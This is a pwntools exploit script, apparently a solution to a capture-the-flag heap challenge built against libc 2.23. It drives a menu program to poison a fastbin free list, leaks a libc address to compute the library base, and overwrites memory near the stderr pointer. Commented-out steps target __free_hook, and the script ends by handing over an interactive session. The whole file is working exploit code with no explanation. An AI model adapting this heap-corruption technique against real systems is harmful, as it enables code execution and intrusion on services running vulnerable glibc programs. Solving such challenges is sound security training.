#!/usr/bin/python3

from pwn import *

exe = ELF('chall1_patched', checksec=False)
libc = ELF('libc-2.23.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        # input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
sla(b"> ", b"1")
sla(b"Size: ", str(0x68))
sa(b"Content: ", b"a" * 8)

sla(b"> ", b"3")
sla(b"> ", b"2")
sa(b"Content: ", p64(0x404040 - 19))

sla(b"> ", b"1")
sla(b"Size: ", str(0x68))
sa(b"Content: ", b"a" * 8)

sla(b"> ", b"1")
sla(b"Size: ", str(0x68))
sa(b"Content: ", b"aaa")

sla(b"> ", b"4")
p.recvuntil(b"aaa")
libc_leak = u64(p.recv(6) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 3786048
info("libc base: " + hex(libc.address))

payload = b'\x31' + b'\x00'*18 + b'\x00'*8 + p64(exe.sym['stderr'])
payload += (91 - len(payload))*b'a' + p64(0x41)
sla(b"> ", b"2")
sa(b"Content: ", payload)

# sla(b"> ", b"3")
# sla(b"> ", b"1")
# sla(b"Size: ", str(0x68))
# sa(b"Content: ", b"a" * 8)

# sla(b"> ", b"3")
# sla(b"> ", b"2")
# sa(b"Content: ", p64(libc.sym['__free_hook'] - 15))

# sla(b"> ", b"1")
# sla(b"Size: ", str(0x68))
# sa(b"Content: ", b"a" * 8)

# sla(b"> ", b"1")
# sla(b"Size: ", str(0x68))
# sa(b"Content: ", b"aaa")
p.interactive()
